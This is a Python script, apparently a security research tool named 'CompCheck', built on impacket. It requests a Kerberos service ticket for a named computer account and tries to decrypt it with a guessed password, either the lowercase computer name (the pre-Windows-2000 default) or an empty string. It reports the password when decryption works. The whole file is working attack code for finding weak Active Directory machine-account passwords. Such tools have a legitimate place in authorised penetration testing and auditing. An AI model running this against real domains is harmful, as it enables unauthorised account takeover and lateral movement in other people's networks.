from Cryptodome.Hash import HMAC, MD4, MD5, SHA
from impacket.krb5.crypto import Key, _enctype_table, _HMACMD5, Enctype
from impacket.krb5.ccache import CCache
from impacket.krb5.types import Principal, Ticket, KerberosTime
from impacket.krb5 import constants
from impacket.krb5.kerberosv5 import sendReceive
from pyasn1.codec.der import decoder, encoder
from impacket.krb5.asn1 import TGS_REP, AS_REP, AP_REQ, seq_set, Authenticator, TGS_REQ, seq_set_iter, EncTGSRepPart
import datetime
import random
from pyasn1.type.univ import noValue, Sequence

# Example usage
# python3 compcheck.py PRE2KCOMPUTER LAB.LOCAL 192.168.130.2 HOST/PRE2KCOMPUTER
# python3 compcheck.py PRE2KCOMPUTER LAB.LOCAL 192.168.130.2

print("CompCheck... by @_xpn_")

# Few changes, like the order of the etypes, the expiry date, which should be the year 2100, and flags shouldn't have renewable_ok set in the TGS_REQ
def getKerberosTGS(serverName, domain, kdcHost, tgt, cipher, sessionKey):
    
    rand = random.SystemRandom()

    # Decode the TGT
    try:
        decodedTGT = decoder.decode(tgt, asn1Spec = AS_REP())[0]
    except:
        decodedTGT = decoder.decode(tgt, asn1Spec = TGS_REP())[0]

    domain = domain.upper()
    # Extract the ticket from the TGT
    ticket = Ticket()
    ticket.from_asn1(decodedTGT['ticket'])

    apReq = AP_REQ()
    apReq['pvno'] = 5
    apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)

    opts = list()
    apReq['ap-options'] =  constants.encodeFlags(opts)
    seq_set(apReq,'ticket', ticket.to_asn1)

    authenticator = Authenticator()
    authenticator['authenticator-vno'] = 5
    authenticator['crealm'] = decodedTGT['crealm'].asOctets()

    clientName = Principal()
    clientName.from_asn1( decodedTGT, 'crealm', 'cname')

    seq_set(authenticator, 'cname', clientName.components_to_asn1)

    now = datetime.datetime.utcnow()
    authenticator['cusec'] =  now.microsecond
    authenticator['ctime'] = KerberosTime.to_asn1(now)

    encodedAuthenticator = encoder.encode(authenticator)

    # Key Usage 7
    # TGS-REQ PA-TGS-REQ padata AP-REQ Authenticator (includes
    # TGS authenticator subkey), encrypted with the TGS session
    # key (Section 5.5.1)
    encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 7, encodedAuthenticator, None)

    apReq['authenticator'] = noValue
    apReq['authenticator']['etype'] = cipher.enctype
    apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator

    encodedApReq = encoder.encode(apReq)

    tgsReq = TGS_REQ()

    tgsReq['pvno'] =  5
    tgsReq['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)
    tgsReq['padata'] = noValue
    tgsReq['padata'][0] = noValue
    tgsReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)
    tgsReq['padata'][0]['padata-value'] = encodedApReq

    reqBody = seq_set(tgsReq, 'req-body')

    opts = list()
    opts.append( constants.KDCOptions.forwardable.value )
    opts.append( constants.KDCOptions.renewable.value )
    #opts.append( constants.KDCOptions.renewable_ok.value )
    opts.append( constants.KDCOptions.canonicalize.value )

    reqBody['kdc-options'] = constants.encodeFlags(opts)
    seq_set(reqBody, 'sname', serverName.components_to_asn1)
    reqBody['realm'] = domain

    # Set now to the date to 13th September 2100 just like Windows does!
    now = datetime.datetime(2100,9,13,2,48,5)

    reqBody['till'] = KerberosTime.to_asn1(now)
    reqBody['nonce'] = rand.getrandbits(31)

    # Update so the order is correct
    seq_set_iter(reqBody, 'etype',
                      (
                          int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value),
                          int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),
                          int(constants.EncryptionTypes.rc4_hmac.value),
                          int(constants.EncryptionTypes.rc4_hmac_exp.value),
                          int(constants.EncryptionTypes.rc4_hmac_old_exp.value)
                       )
                )

    message = encoder.encode(tgsReq)

    r = sendReceive(message, domain, kdcHost)

    # Get the session key
    tgs = decoder.decode(r, asn1Spec = TGS_REP())[0]

    cipherText = tgs['enc-part']['cipher']

    # Key Usage 8
    # TGS-REP encrypted part (includes application session
    # key), encrypted with the TGS session key (Section 5.4.2)
    plainText = cipher.decrypt(sessionKey, 8, cipherText)

    encTGSRepPart = decoder.decode(plainText, asn1Spec = EncTGSRepPart())[0]

    newSessionKey = Key(encTGSRepPart['key']['keytype'], encTGSRepPart['key']['keyvalue'].asOctets())
    # Creating new cipher based on received keytype
    cipher = _enctype_table[encTGSRepPart['key']['keytype']]

    # Check we've got what we asked for
    res = decoder.decode(r, asn1Spec = TGS_REP())[0]
    spn = Principal()
    spn.from_asn1(res['ticket'], 'realm', 'sname')

    if spn.components[0] == serverName.components[0]:
        # Yes.. bye bye
        return r, cipher, sessionKey, newSessionKey
    else:
        # Let's extract the Ticket, change the domain and keep asking
        domain = spn.components[1]
        return getKerberosTGS(serverName, domain, kdcHost, r, cipher, newSessionKey)

# Handle input arguments
import argparse
parser = argparse.ArgumentParser(description='Check if a password is valid for a given user')
parser.add_argument('computer', help='Computer to check')
parser.add_argument('domain', help='Domain to check')
parser.add_argument('kdcHost', help='KDC host to check')
parser.add_argument('SPN', help='SPN to check', nargs='?')
args = parser.parse_args()

# Password is usually just the computer name without the dollar and lowercase
if args.computer.endswith('$'):
  password = args.computer[:-1].lower()
  username = args.computer.upper()
  usernameWithoutDollar = args.computer.upper()[:-1]
else:
  password = args.computer.lower()
  username = args.computer.upper() + "$"
  usernameWithoutDollar = args.computer.upper()

username = args.computer.upper()
indomain = args.domain
SPN = args.SPN
kdcHost = args.kdcHost

# Grab our current TGT
try:
  domain, _, TGT, _ = CCache.parseFile(indomain)
  if TGT == None:
     raise
except:
  print("[!] No TGT found, please run getTGT.py first")
  exit()

tgt, cipher, sessionKey = TGT['KDC_REP'], TGT['cipher'], TGT['sessionKey']
oldSessionKey = sessionKey

# Get a TGS for the SPN
if SPN == None:
  print(f"[*] Requesting TGS with principal {username}")
  serverName = Principal(username, type=constants.PrincipalNameType.NT_ENTERPRISE.value)
  r, cipher, oldSessionKey, sessionKey = getKerberosTGS(serverName, domain, kdcHost, tgt, cipher, sessionKey)
else:   
  print(f"[*] Requesting TGS for SPN {SPN}")
  serverName = Principal(SPN, type=constants.PrincipalNameType.NT_SRV_INST.value)
  r, cipher, oldSessionKey, sessionKey = getKerberosTGS(serverName, domain, kdcHost, tgt, cipher, sessionKey)

# Parse the TGS
tgs = decoder.decode(r, asn1Spec = TGS_REP())[0]

# Attempt to decrypt the TGS
cipherText = tgs['ticket']['enc-part']['cipher']
newCipher = _enctype_table[int(tgs['ticket']['enc-part']['etype'])]

if newCipher.enctype == Enctype.RC4:
  print("[*] Using RC4")
  key = newCipher.string_to_key(password, '', None)
  key2 = newCipher.string_to_key('', '', None)
else:
  print("[*] Using AES")
  key = newCipher.string_to_key(password, domain.upper()+"host"+usernameWithoutDollar.lower()+"."+domain.lower(), None)
  key2 = newCipher.string_to_key('', domain.upper()+"host"+usernameWithoutDollar.lower()+"."+domain.lower(), None)

try:
  plainText = newCipher.decrypt(key, 2, cipherText)
  print(f"[***] Decrypted ticket successfully, password is [{password}]")
except:
  try:
    plainText = newCipher.decrypt(key2, 2, cipherText)
    print(f"[***] Decrypted ticket successfully, password is [''] (empty string)")
  except:
    print("[!] Failed to decrypt TGS")